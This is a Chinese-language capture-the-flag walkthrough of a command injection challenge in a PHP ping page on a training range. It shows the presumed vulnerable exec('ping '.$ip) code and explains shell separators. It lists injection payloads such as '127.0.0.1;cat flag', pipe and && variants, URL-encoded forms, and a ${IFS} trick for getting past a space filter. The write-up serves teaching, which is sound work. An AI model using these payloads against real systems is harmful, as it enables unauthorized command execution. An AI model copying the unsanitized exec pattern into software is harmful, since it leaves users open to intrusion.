访问地址：`/vul/rce/rce_ping.php`，页面提示：`Here, please enter the target IP address!`，后端执行 `exec("ping 你输入的内容")`，属于**命令注入（RCE，远程命令执行）漏洞**。

> 
> PHP 代码推测：

```
$ip = $_GET['ip'];
exec("ping ".$ip, $ret);
```

直接把用户输入拼进系统 ping 命令，没有过滤分隔符，就可以拼接多条系统命令。

## 核心原理：命令分隔符

linux 下可以用符号截断前面 ping 命令，再执行新命令：

表格

| 符号 | 作用 |
| --- | --- |
| `;` | 顺序执行多条命令；前面执行完继续跑后面 |
| `\|` | 管道，把前一条输出给后一条 |
| `\|\|` | 前面失败才执行后面 |
| `&&` | 前面成功才执行后面 |

## Payload 传入方式

url 参数：`?ip=你的payload`

### 1. 基础测试，查看当前目录文件

payload：

```
127.0.0.1;ls
```

完整 url：

```
https://27aedf8e3e0b4557b080c5a54e4a7f5c--8081.ap-shanghai2.cloudstudio.club/vul/rce/rce_ping.php?ip=127.0.0.1;ls
```

> 
> 有些浏览器`;`会被 url 编码，也可以用 `|` 代替：`?ip=127.0.0.1|ls`

### 2. 读取 flag（CTF 常规）

看到文件名比如`flag.php`或者`flag`，就 cat 读取

```
?ip=127.0.0.1;cat flag
```

### 3. 如果分号被过滤

改用管道符 `|`

```
?ip=127.0.0.1|cat flag
```

### 4. && 版本

```
?ip=127.0.0.1&&cat flag
```

## 常见坑点

1. **url 编码问题**`;` 浏览器部分场景自动编码成`%3B`，payload 也可以手动写编码版本：`?ip=127.0.0.1%3Bcat%20flag`，`%20`代表空格。
2. 空格被过滤
如果空格拦截，linux 可以 `${IFS}` 代替空格

```
127.0.0.1;cat${IFS}flag
```

3. 回显混杂 ping 输出
页面会同时输出 ping 命令结果 + 你执行 ls/cat 的输出，往下翻页面就能看到命令执行结果。

## 快速测试 payload 清单直接复制尝试

```
?vul/rce/rce_ping.php?ip=127.0.0.1;ls
?vul/rce/rce_ping.php?ip=127.0.0.1|ls
?vul/rce/rce_ping.php?ip=127.0.0.1;cat flag
?vul/rce/rce_ping.php?ip=127.0.0.1%3Bcat%20flag
```



